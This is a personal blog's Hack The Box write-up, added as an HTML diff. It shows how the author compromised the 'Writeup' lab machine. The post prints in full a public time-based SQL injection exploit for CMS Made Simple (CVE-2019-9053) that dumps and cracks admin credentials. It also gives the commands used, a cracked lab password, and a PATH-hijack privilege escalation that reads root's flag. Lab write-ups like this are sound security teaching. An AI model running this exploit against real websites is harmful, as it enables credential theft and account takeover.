@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: https://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible"
+      content="IE=edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0" />
+<meta name="description"
+      content="Adventures of Functional Mediocrity" />
+<meta name="keywords"
+      content="zola, theme, ink, hugo-ink" /> 
+
+<title>John Tuyen | Writeup</title>
+<meta
+  property="og:title"
+  content="John Tuyen | Writeup"
+/>
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://johntuyen.com/posts/htb-writeup/" />
+<meta property="og:description" content="Adventures of Functional Mediocrity" />
+<meta property="og:image" content="" />
+<meta property="og:image:url" content="" />
+<meta property="og:image:secure_url" content="" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Writeup" />
+<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
+<meta property="twitter:image" content="" />
+
+<link rel="alternate"
+          type="application/rss+xml"
+          title="John Tuyen"
+          href="https://johntuyen.com/atom.xml">
+    <link rel="preconnect"
+          href="https://fonts.googleapis.com">
+    <link rel="preconnect"
+          href="https://fonts.gstatic.com"
+          crossorigin>
+    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
+    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
+          rel="stylesheet">
+    <link rel="stylesheet"
+          href="https://johntuyen.com/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
+            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
+            crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <header>
+        <a class="site-name"
+           href="/">
+            <h1>John Tuyen</h1>
+        </a>
+        <div class="site-description">
+            <p>Adventures of Functional Mediocrity</p>
+        </div>
+        <nav>
+            <div class="links"> 
+            <a 
+                href="https://johntuyen.com/ ">About</a> 
+            <a 
+                href="https://johntuyen.com/posts/ ">Posts</a> 
+            <a 
+                href="https://johntuyen.com/gallery/ ">Gallery</a> 
+            <a 
+                href="https://johntuyen.com/tags/ ">Tags</a> 
+            <a 
+                href="https://johntuyen.com/search/ ">Search</a> 
+            </div>
+        </nav>
+    </header>
+    <article>
+    
+
+<section class="post">
+  <div class="post-header">
+    <div class="meta">
+      <div class="date">
+        <span class="day">12</span>
+        <span class="rest">Oct 19</span>
+      </div>
+    </div>
+
+    <div class="matter">
+      <h1 class="title">Writeup </h1>
+    </div>
+  </div>
+    
+  <article><ol>
+<li>
+<p>Ports show 22 and 80 being opened. Port 80 hosts this weird page with ascii art on the home page. Scanning using dirbuster or dirsearch is useless as it bans my IP.  Although my nmap scan managed to find a <code>robot.txt</code> file that contains a disallowed entry for <code>/writeup/</code> directory.</p>
+<p>Visiting the page doesn't yield much information besides previous write ups of other HTB boxes. Looking through the source code revealed more information, the web page being hosted is using a platform called CMS Made Simple.</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">meta </span><span style="color:#d08770;">name</span><span>=&quot;</span><span style="color:#a3be8c;">Generator</span><span>&quot; </span><span style="color:#d08770;">content</span><span>=&quot;</span><span style="color:#a3be8c;">CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.</span><span>&quot; /&gt;
+</span></code></pre>
+<p>Seeing that the copyright is 2019, I think the CMS version is very new.</p>
+<p>Further investigation also shows a login link. Since I don't know what password is, I'll keep this aside just in case I need it.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>http://10.10.10.138/writeup/admin/login.php
+</span></code></pre>
+</li>
+<li>
+<p>With all the information that I've found so far, it was time to Google what exploits I can utilize to get my way into user land. I found this <a href="https://packetstormsecurity.com/files/152356/cmsmadesimple22-sql.txt">script</a>. It's a SQL injection script targeting the CMS platform.</p>
+<p>I had trouble running with this script as it couldn't find the URL to exploit. After manually troubleshooting this script, I found the proper URL:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://10.10.10.138/writeup/moduleinterface.php?mact=News,m1_,default,0
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-writeup/htb-writeup-moduleinterface.png" alt="htb-writeup-moduleinterface" /></p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/env python
+</span><span style="color:#65737e;"># Exploit Title: Unauthenticated SQL Injection on CMS Made Simple &lt;= 2.2.9
+</span><span style="color:#65737e;"># Date: 30-03-2019
+</span><span style="color:#65737e;"># Exploit Author: Daniele Scanu @ Certimeter Group
+</span><span style="color:#65737e;"># Vendor Homepage: https://www.cmsmadesimple.org/
+</span><span style="color:#65737e;"># Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
+</span><span style="color:#65737e;"># Version: &lt;= 2.2.9
+</span><span style="color:#65737e;"># Tested on: Ubuntu 18.04 LTS
+</span><span style="color:#65737e;"># CVE : CVE-2019-9053
+</span><span>
+</span><span style="color:#b48ead;">import </span><span>requests
+</span><span style="color:#b48ead;">from </span><span>termcolor </span><span style="color:#b48ead;">import </span><span>colored
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span style="color:#b48ead;">from </span><span>termcolor </span><span style="color:#b48ead;">import </span><span>cprint
+</span><span style="color:#b48ead;">import </span><span>optparse
+</span><span style="color:#b48ead;">import </span><span>hashlib
+</span><span>
+</span><span>parser = optparse.</span><span style="color:#bf616a;">OptionParser</span><span>()
+</span><span>parser.</span><span style="color:#bf616a;">add_option</span><span>(&#39;</span><span style="color:#a3be8c;">-u</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">--url</span><span>&#39;, </span><span style="color:#bf616a;">action</span><span>=&quot;</span><span style="color:#a3be8c;">store</span><span>&quot;, </span><span style="color:#bf616a;">dest</span><span>=&quot;</span><span style="color:#a3be8c;">url</span><span>&quot;, </span><span style="color:#bf616a;">help</span><span>=&quot;</span><span style="color:#a3be8c;">Base target uri (ex. http://10.10.10.138/writeup)</span><span>&quot;)
+</span><span>parser.</span><span style="color:#bf616a;">add_option</span><span>(&#39;</span><span style="color:#a3be8c;">-w</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">--wordlist</span><span>&#39;, </span><span style="color:#bf616a;">action</span><span>=&quot;</span><span style="color:#a3be8c;">store</span><span>&quot;, </span><span style="color:#bf616a;">dest</span><span>=&quot;</span><span style="color:#a3be8c;">wordlist</span><span>&quot;, </span><span style="color:#bf616a;">help</span><span>=&quot;</span><span style="color:#a3be8c;">Wordlist for crack admin password</span><span>&quot;)
+</span><span>parser.</span><span style="color:#bf616a;">add_option</span><span>(&#39;</span><span style="color:#a3be8c;">-c</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">--crack</span><span>&#39;, </span><span style="color:#bf616a;">action</span><span>=&quot;</span><span style="color:#a3be8c;">store_true</span><span>&quot;, </span><span style="color:#bf616a;">dest</span><span>=&quot;</span><span style="color:#a3be8c;">cracking</span><span>&quot;, </span><span style="color:#bf616a;">help</span><span>=&quot;</span><span style="color:#a3be8c;">Crack password with wordlist</span><span>&quot;, </span><span style="color:#bf616a;">default</span><span>=</span><span style="color:#d08770;">False</span><span>)
+</span><span>
+</span><span>options, args = parser.</span><span style="color:#bf616a;">parse_args</span><span>()
+</span><span style="color:#b48ead;">if </span><span>not options.url:
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">[+] Specify an url target</span><span>&quot;
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">[+] Example usage (no cracking password): exploit.py -u http://target-uri</span><span>&quot;
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist</span><span>&quot;
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.</span><span>&quot;
+</span><span>    </span><span style="color:#bf616a;">exit</span><span>()
+</span><span>
+</span><span>url_vuln = options.url + &#39;</span><span style="color:#a3be8c;">/moduleinterface.php?mact=News,m1_,default,0</span><span>&#39;
+</span><span>session = requests.</span><span style="color:#bf616a;">Session</span><span>()
+</span><span>dictionary = &#39;</span><span style="color:#a3be8c;">1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$</span><span>&#39;
+</span><span>flag = </span><span style="color:#d08770;">True
+</span><span>password = &quot;&quot;
+</span><span>temp_password = &quot;&quot;
+</span><span style="color:#bf616a;">TIME </span><span>= </span><span style="color:#d08770;">5
+</span><span>db_name = &quot;&quot;
+</span><span>output = &quot;&quot;
+</span><span>email = &quot;&quot;
+</span><span>
+</span><span>salt = &#39;&#39;
+</span><span>wordlist = &quot;&quot;
+</span><span style="color:#b48ead;">if </span><span>options.wordlist:
+</span><span>    wordlist += options.wordlist
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">crack_password</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>password
+</span><span>    </span><span style="color:#b48ead;">global </span><span>output
+</span><span>    </span><span style="color:#b48ead;">global </span><span>wordlist
+</span><span>    </span><span style="color:#b48ead;">global </span><span>salt
+</span><span>    dict = </span><span style="color:#96b5b4;">open</span><span>(wordlist)
+</span><span>    </span><span style="color:#b48ead;">for </span><span>line </span><span style="color:#b48ead;">in </span><span>dict.</span><span style="color:#bf616a;">readlines</span><span>():
+</span><span>        line = line.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;, &quot;&quot;)
+</span><span>        </span><span style="color:#bf616a;">beautify_print_try</span><span>(line)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>hashlib.</span><span style="color:#bf616a;">md5</span><span>(</span><span style="color:#bf616a;">str</span><span>(salt) + line).</span><span style="color:#bf616a;">hexdigest</span><span>() == password:
+</span><span>            output += &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+] Password cracked: </span><span>&quot; + line
+</span><span>            </span><span style="color:#b48ead;">break
+</span><span>    dict.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">beautify_print_try</span><span>(</span><span style="color:#bf616a;">value</span><span>):
+</span><span>    </span><span style="color:#b48ead;">global </span><span>output
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">c</span><span>&quot;
+</span><span>    </span><span style="color:#bf616a;">cprint</span><span>(output,&#39;</span><span style="color:#a3be8c;">green</span><span>&#39;, </span><span style="color:#bf616a;">attrs</span><span>=[&#39;</span><span style="color:#a3be8c;">bold</span><span>&#39;])
+</span><span>    </span><span style="color:#bf616a;">cprint</span><span>(&#39;</span><span style="color:#a3be8c;">[*] Try: </span><span>&#39; + value, &#39;</span><span style="color:#a3be8c;">red</span><span>&#39;, </span><span style="color:#bf616a;">attrs</span><span>=[&#39;</span><span style="color:#a3be8c;">bold</span><span>&#39;])
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">beautify_print</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>output
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">c</span><span>&quot;
+</span><span>    </span><span style="color:#bf616a;">cprint</span><span>(output,&#39;</span><span style="color:#a3be8c;">green</span><span>&#39;, </span><span style="color:#bf616a;">attrs</span><span>=[&#39;</span><span style="color:#a3be8c;">bold</span><span>&#39;])
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">dump_salt</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>flag
+</span><span>    </span><span style="color:#b48ead;">global </span><span>salt
+</span><span>    </span><span style="color:#b48ead;">global </span><span>output
+</span><span>    ord_salt = &quot;&quot;
+</span><span>    ord_salt_temp = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">while </span><span>flag:
+</span><span>        flag = </span><span style="color:#d08770;">False
+</span><span>        </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(dictionary)):
+</span><span>            temp_salt = salt + dictionary[i]
+</span><span>            ord_salt_temp = ord_salt + </span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(dictionary[i]))[</span><span style="color:#d08770;">2</span><span>:]
+</span><span>            </span><span style="color:#bf616a;">beautify_print_try</span><span>(temp_salt)
+</span><span>            payload = &quot;</span><span style="color:#a3be8c;">a,b,1,5))+and+(select+sleep(</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#bf616a;">TIME</span><span>) + &quot;</span><span style="color:#a3be8c;">)+from+cms_siteprefs+where+sitepref_value+like+0x</span><span>&quot; + ord_salt_temp + &quot;</span><span style="color:#a3be8c;">25+and+sitepref_name+like+0x736974656d61736b)+--+</span><span>&quot;
+</span><span>            url = url_vuln + &quot;</span><span style="color:#a3be8c;">&amp;m1_idlist=</span><span>&quot; + payload
+</span><span>            start_time = time.</span><span style="color:#bf616a;">time</span><span>()
+</span><span>            r = session.</span><span style="color:#bf616a;">get</span><span>(url)
+</span><span>            elapsed_time = time.</span><span style="color:#bf616a;">time</span><span>() - start_time
+</span><span>            </span><span style="color:#b48ead;">if </span><span>elapsed_time &gt;= </span><span style="color:#bf616a;">TIME</span><span>:
+</span><span>                flag = </span><span style="color:#d08770;">True
+</span><span>                </span><span style="color:#b48ead;">break
+</span><span>        </span><span style="color:#b48ead;">if </span><span>flag:
+</span><span>            salt = temp_salt
+</span><span>            ord_salt = ord_salt_temp
+</span><span>    flag = </span><span style="color:#d08770;">True
+</span><span>    output += &#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+] Salt for password found: </span><span>&#39; + salt
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">dump_password</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>flag
+</span><span>    </span><span style="color:#b48ead;">global </span><span>password
+</span><span>    </span><span style="color:#b48ead;">global </span><span>output
+</span><span>    ord_password = &quot;&quot;
+</span><span>    ord_password_temp = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">while </span><span>flag:
+</span><span>        flag = </span><span style="color:#d08770;">False
+</span><span>        </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(dictionary)):
+</span><span>            temp_password = password + dictionary[i]
+</span><span>            ord_password_temp = ord_password + </span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(dictionary[i]))[</span><span style="color:#d08770;">2</span><span>:]
+</span><span>            </span><span style="color:#bf616a;">beautify_print_try</span><span>(temp_password)
+</span><span>            payload = &quot;</span><span style="color:#a3be8c;">a,b,1,5))+and+(select+sleep(</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#bf616a;">TIME</span><span>) + &quot;</span><span style="color:#a3be8c;">)+from+cms_users</span><span>&quot;
+</span><span>            payload += &quot;</span><span style="color:#a3be8c;">+where+password+like+0x</span><span>&quot; + ord_password_temp + &quot;</span><span style="color:#a3be8c;">25+and+user_id+like+0x31)+--+</span><span>&quot;
+</span><span>            url = url_vuln + &quot;</span><span style="color:#a3be8c;">&amp;m1_idlist=</span><span>&quot; + payload
+</span><span>            start_time = time.</span><span style="color:#bf616a;">time</span><span>()
+</span><span>            r = session.</span><span style="color:#bf616a;">get</span><span>(url)
+</span><span>            elapsed_time = time.</span><span style="color:#bf616a;">time</span><span>() - start_time
+</span><span>            </span><span style="color:#b48ead;">if </span><span>elapsed_time &gt;= </span><span style="color:#bf616a;">TIME</span><span>:
+</span><span>                flag = </span><span style="color:#d08770;">True
+</span><span>                </span><span style="color:#b48ead;">break
+</span><span>        </span><span style="color:#b48ead;">if </span><span>flag:
+</span><span>            password = temp_password
+</span><span>            ord_password = ord_password_temp
+</span><span>    flag = </span><span style="color:#d08770;">True
+</span><span>    output += &#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+] Password found: </span><span>&#39; + password
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">dump_username</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>flag
+</span><span>    </span><span style="color:#b48ead;">global </span><span>db_name
+</span><span>    </span><span style="color:#b48ead;">global </span><span>output
+</span><span>    ord_db_name = &quot;&quot;
+</span><span>    ord_db_name_temp = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">while </span><span>flag:
+</span><span>        flag = </span><span style="color:#d08770;">False
+</span><span>        </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(dictionary)):
+</span><span>            temp_db_name = db_name + dictionary[i]
+</span><span>            ord_db_name_temp = ord_db_name + </span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(dictionary[i]))[</span><span style="color:#d08770;">2</span><span>:]
+</span><span>            </span><span style="color:#bf616a;">beautify_print_try</span><span>(temp_db_name)
+</span><span>            payload = &quot;</span><span style="color:#a3be8c;">a,b,1,5))+and+(select+sleep(</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#bf616a;">TIME</span><span>) + &quot;</span><span style="color:#a3be8c;">)+from+cms_users+where+username+like+0x</span><span>&quot; + ord_db_name_temp + &quot;</span><span style="color:#a3be8c;">25+and+user_id+like+0x31)+--+</span><span>&quot;
+</span><span>            url = url_vuln + &quot;</span><span style="color:#a3be8c;">&amp;m1_idlist=</span><span>&quot; + payload
+</span><span>            start_time = time.</span><span style="color:#bf616a;">time</span><span>()
+</span><span>            r = session.</span><span style="color:#bf616a;">get</span><span>(url)
+</span><span>            elapsed_time = time.</span><span style="color:#bf616a;">time</span><span>() - start_time
+</span><span>            </span><span style="color:#b48ead;">if </span><span>elapsed_time &gt;= </span><span style="color:#bf616a;">TIME</span><span>:
+</span><span>                flag = </span><span style="color:#d08770;">True
+</span><span>                </span><span style="color:#b48ead;">break
+</span><span>        </span><span style="color:#b48ead;">if </span><span>flag:
+</span><span>            db_name = temp_db_name
+</span><span>            ord_db_name = ord_db_name_temp
+</span><span>    output += &#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+] Username found: </span><span>&#39; + db_name
+</span><span>    flag = </span><span style="color:#d08770;">True
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">dump_email</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>flag
+</span><span>    </span><span style="color:#b48ead;">global </span><span>email
+</span><span>    </span><span style="color:#b48ead;">global </span><span>output
+</span><span>    ord_email = &quot;&quot;
+</span><span>    ord_email_temp = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">while </span><span>flag:
+</span><span>        flag = </span><span style="color:#d08770;">False
+</span><span>        </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(dictionary)):
+</span><span>            temp_email = email + dictionary[i]
+</span><span>            ord_email_temp = ord_email + </span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(dictionary[i]))[</span><span style="color:#d08770;">2</span><span>:]
+</span><span>            </span><span style="color:#bf616a;">beautify_print_try</span><span>(temp_email)
+</span><span>            payload = &quot;</span><span style="color:#a3be8c;">a,b,1,5))+and+(select+sleep(</span><span>&quot; + </span><span style="color:#bf616a;">str</span><span>(</span><span style="color:#bf616a;">TIME</span><span>) + &quot;</span><span style="color:#a3be8c;">)+from+cms_users+where+email+like+0x</span><span>&quot; + ord_email_temp + &quot;</span><span style="color:#a3be8c;">25+and+user_id+like+0x31)+--+</span><span>&quot;
+</span><span>            url = url_vuln + &quot;</span><span style="color:#a3be8c;">&amp;m1_idlist=</span><span>&quot; + payload
+</span><span>            start_time = time.</span><span style="color:#bf616a;">time</span><span>()
+</span><span>            r = session.</span><span style="color:#bf616a;">get</span><span>(url)
+</span><span>            elapsed_time = time.</span><span style="color:#bf616a;">time</span><span>() - start_time
+</span><span>            </span><span style="color:#b48ead;">if </span><span>elapsed_time &gt;= </span><span style="color:#bf616a;">TIME</span><span>:
+</span><span>                flag = </span><span style="color:#d08770;">True
+</span><span>                </span><span style="color:#b48ead;">break
+</span><span>        </span><span style="color:#b48ead;">if </span><span>flag:
+</span><span>            email = temp_email
+</span><span>            ord_email = ord_email_temp
+</span><span>    output += &#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[+] Email found: </span><span>&#39; + email
+</span><span>    flag = </span><span style="color:#d08770;">True
+</span><span>
+</span><span style="color:#bf616a;">dump_salt</span><span>()
+</span><span style="color:#bf616a;">dump_username</span><span>()
+</span><span style="color:#bf616a;">dump_email</span><span>()
+</span><span style="color:#bf616a;">dump_password</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>options.cracking:
+</span><span>    </span><span style="color:#b48ead;">print </span><span style="color:#bf616a;">colored</span><span>(&quot;</span><span style="color:#a3be8c;">[*] Now try to crack password</span><span>&quot;)
+</span><span>    </span><span style="color:#bf616a;">crack_password</span><span>()
+</span><span>
+</span><span style="color:#bf616a;">beautify_print</span><span>()
+</span></code></pre>
+</li>
+<li>
+<p>Execute the exploit script:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>python cmsmadesimple22-sql.py -u http://10.10.10.138/writeup
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-writeup/htb-writeup-pythonhash.png" alt="htb-writeup-pythonhash" /></p>
+<p>As you can see, the result isn't proper, it's missing some characters. Another adjustment to the script was the TIME parameter. Adjusting the time to a sleep a few more seconds produced accurate results.</p>
+</li>
+<li>
+<p>I wonder what the hashes mean. I used hashkiller and other online hash sites and no results showed up.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span># hash-identifier
+</span><span>
+</span><span>HASH: 5a599ef579066807
+</span><span>
+</span><span>Possible Hashs:
+</span><span>[+]  MySQL
+</span><span>[+]  MD5(Middle)
+</span><span>
+</span><span>Least Possible Hashs:
+</span><span>[+]  MD5(Half)
+</span><span>
+</span><span>   -------------------------------------------------------------------------
+</span><span> HASH: 62def4866937f08cc13bab43bb14e6f7
+</span><span>
+</span><span>Possible Hashs:
+</span><span>[+]  MD5
+</span><span>[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+</span></code></pre>
+</li>
+<li>
+<p>Surprisingly, the exploit script also included the function to brute force the hash using a dictionary file of your choice. I used <code>rockyou.txt</code> and executed the script again:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>python cmsmadesimple22-sql.py -u http://10.10.10.138/writeup --c -w /usr/share/wordlists/rockyou.txt
+</span></code></pre>
+<p><img src="https://johntuyen.com/posts/htb-writeup/htb-writeup-passwordcrack.png" alt="htb-writeup-passwordcrack" /></p>
+<p>I found the password! Now how do I log in? I remembered that SSH was opened so I tried that since we have the username as well.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>ssh jkr@writeup
+</span><span>password: raykayjay9
+</span></code></pre>
+<p>User flag has been obtained.</p>
+</li>
+</ol>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<ol>
+<li>
+<p>This is where it got hard for me. Running <code>LinEnum</code> and <code>linuxprivchecker</code> scripts didn't produce results that lead to privesc, more like rabbit holes of trying to manipulate PATH to run <code>/etc/update-motd/10-uname</code> script.</p>
+</li>
+<li>
+<p>After reading some hints for this machine, there is a <a href="https://github.com/DominicBreuker/pspy">pspy tool</a> that I had to use to watch processes that are being spawned after someone logs into the machine via ssh. The problem is I have a VIP subscription and there isn't much traffic to monitor to spot the anomaly that I was suppose to look for. I ran the <code>pspy</code> for 3 days and see I would catch something in the logs. Nope, all I saw that stood out was this line:</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new
+</span><span>
+</span><span>/bin/sh /usr/local/sbin/run-parts --lsbsysinit /etc/update-motd.d
+</span></code></pre>
+</li>
+<li>
+<p>I got stuck on this problem for 2-3 days now and was annoyed that I know it was something simple. Then someone gave me a hint, wasn't even a specific one about PATHs, it was a simple question of &quot;how does PATH work?&quot;. I stared at the logs again and something started to click.</p>
+<p><img src="https://johntuyen.com/posts/htb-writeup/htb-writeup-runpartspath.png" alt="htb-writeup-runpartspath" /></p>
+<p>Notice that <code>run-parts</code> binary is located in <code>bin</code> directory which is the 3rd position of where PATH will start looking for the binary of the user's current PATH.</p>
+<p><img src="https://johntuyen.com/posts/htb-writeup/htb-writeup-currentpath.png" alt="htb-writeup-currentpath" /></p>
+<p>Knowing that, it's a matter of creating a symbolic link in <code>/usr/local/bin</code> with the name <code>run-parts</code> that contain a line of code that will read and output <code>root.txt</code>.</p>
+<pre data-lang="shell" style="background-color:#2b303b;color:#c0c5ce;" class="language-shell "><code class="language-shell" data-lang="shell"><span>vi /usr/local/bin/test
+</span><span>
+</span><span>cat /root/root.txt /tmp/rooted.txt
+</span></code></pre>
+<p>You won't be able to read the <code>/usr/local/bin</code> directory due to permissions but this doesn't matter as long as we have write permissions.</p>
+</li>
+<li>
+<p>Trigger the <code>run-parts</code> executable by logging into SSH in another session. Check the <code>/tmp/rooted.txt</code> for the flag.</p>
+</li>
+</ol>
+<p><code>Protip</code>{: .info }</p>
+<p>I found this useful site: <a href="https://explainshell.com/">https://explainshell.com/</a></p>
+</article>
+
+  
+    
+  
+  <ul class="tags">
+    
+      <li><a href='https://johntuyen.com/tags/hackthebox'>hackthebox</a></li>
+    
+  </ul>
+  
+  
+    
+</section>
+</article>
+    <footer>
+        <div class="social">
+            <ul> 
+                 
+                <li>
+                    <a href="https://github.com/jtuyen"
+                       title="Github" rel="me"><i data-feather="github"></i></a>
+                </li>
+                 
+                 
+                <li>
+                    <a href="https://twitter.com/jtuyen"
+                       title="Twitter"
+                       rel="me"><i data-feather="twitter"></i></a>
+                </li>
+                
+                
+                
+                <li>
+                    <a href="https://johntuyen.com/atom.xml"
+                       title="John Tuyen"><i data-feather="rss"></i></a>
+                </li>
+            </ul>
+        </div>
+        <p> © John Tuyen 2024
+
+        
+        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
+        </p>
+    </footer>
+    <script>
+        feather.replace();
+    </script> 
+    </body>
+</html>
